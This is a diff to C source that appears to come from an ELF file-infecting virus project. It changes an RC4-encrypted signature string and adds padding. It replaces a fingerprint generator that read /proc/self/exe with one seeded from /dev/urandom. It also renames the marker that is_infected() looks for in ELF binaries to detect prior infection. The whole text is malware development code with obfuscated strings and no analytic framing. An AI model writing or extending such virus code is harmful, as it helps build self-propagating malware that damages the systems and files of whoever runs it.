@@ -12,14 +12,22 @@ static void deobfuscate_key(unsigned char *key_out) {
 }
 
 __attribute__((section(".data")))
+unsigned char SIGNATURE_PADDING_START[] = {
+    0xDE, 0xAD, 0xBE, 0xEF,
+    0xCA, 0xFE, 0xBA, 0xBE,
+    0x99, 0xa4, 0x9c, 0x24, 0xb2
+};
+
+__attribute__((section(".data")))
 unsigned char ENCRYPTED_BASE_SIG[] = {
-    0x99, 0xa4, 0x9c, 0x24, 0xb2, 0x0c, 0x56, 0x94,
-    0xd0, 0xd5, 0x54, 0x9d, 0xdd, 0xbe, 0x91, 0xbf,
-    0xbd, 0x77, 0x6b, 0x81, 0x66, 0x67, 0x00, 0x90,
-    0x23, 0x8d, 0xcf, 0xf1, 0x53, 0x97, 0xb4, 0x42,
-    0xbe, 0xeb, 0x34, 0x3a, 0x85, 0x1a, 0x89, 0xee,
-    0xdd, 0x9a, 0x03, 0x2d, 0xfd, 0x5b, 0x14, 0x01,
-    0xcc,
+    0xf2, 0xf9, 0xd2, 0x53, 0x85, 0x3b, 0x7b, 0xb4,
+    0xf0, 0xfd, 0x04, 0x83, 0xd2, 0xb0, 0xf6, 0xfe,
+    0xe7, 0x34, 0x34, 0x8b, 0x70, 0x71, 0x0d, 0xdf,
+    0x2f, 0xd4, 0xde, 0xb5, 0x02, 0xde, 0xf2, 0x40,
+    0xe1, 0xe5, 0x23, 0x7f, 0xcc, 0x1a, 0x81, 0xe1,
+    0x94, 0x94, 0x03, 0x28, 0xbe, 0x4e, 0x42, 0x4d,
+    0x9f, 0x2a, 0x4c, 0xf3, 0x77, 0xfb, 0x77, 0x74,
+    0xf4, 0x94, 0x69, 0x15, 0xed, 0x3b, 0x19,
 };
 __attribute__((section(".data")))
 unsigned char SIGNATURE_PADDING[32] = {
@@ -28,28 +36,25 @@ unsigned char SIGNATURE_PADDING[32] = {
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
-static const size_t BASE_SIG_LEN = 49;
+static const size_t BASE_SIG_LEN = 63;
 
-static uint32_t generate_fingerprint(void) {
+static uint32_t generate_new_fingerprint(void) {
     uint32_t seed = 0;
     
     seed ^= (uint32_t)time(NULL);
     seed ^= (uint32_t)getpid();
     seed ^= (uint32_t)(uintptr_t)&seed;
     
-    int fd = open("/proc/self/exe", O_RDONLY);
+    int fd = open("/dev/urandom", O_RDONLY);
     if (fd >= 0) {
-        unsigned char entropy[8];
-        lseek(fd, 0x100, SEEK_SET);
-        read(fd, entropy, sizeof(entropy));
+        uint32_t random_val;
+        read(fd, &random_val, sizeof(random_val));
+        seed ^= random_val;
         close(fd);
-        
-        for (size_t i = 0; i < sizeof(entropy); i++) {
-            seed ^= (entropy[i] << (i % 24));
-        }
     }
     
-    if (seed == 0) seed = 0xDEADBEEF;
+    seed = (seed << 13) | (seed >> 19);
+    seed ^= 0xDEADBEEF;
     
     return seed;
 }
@@ -65,23 +70,22 @@ const char *get_signature(void) {
         memcpy(signature, ENCRYPTED_BASE_SIG, BASE_SIG_LEN);
         rc4_crypt((unsigned char *)signature, BASE_SIG_LEN, rc4_key, KEY_LEN);
         
-        uint32_t fingerprint = generate_fingerprint();
+        uint32_t fingerprint = generate_new_fingerprint();
         size_t base_len = strlen(signature);
         
         snprintf(signature + base_len, 
                  MAX_SIGNATURE_LEN - base_len, 
-                 "[%08X]", 
+                 "[%016x]", 
                  fingerprint);
         
         decrypted = true;
     }
-    printf("signature en .c |%s|\n", signature);
     return signature;
 }
 
 bool is_infected(t_elf *elf) {
 
-    const char base_marker[] = "War version 1.0";
+    const char base_marker[] = "<<<WAR_SIG>>>";
     size_t marker_len = strlen(base_marker);
     
     for (size_t i = 0; i < elf->size - marker_len; i++) {
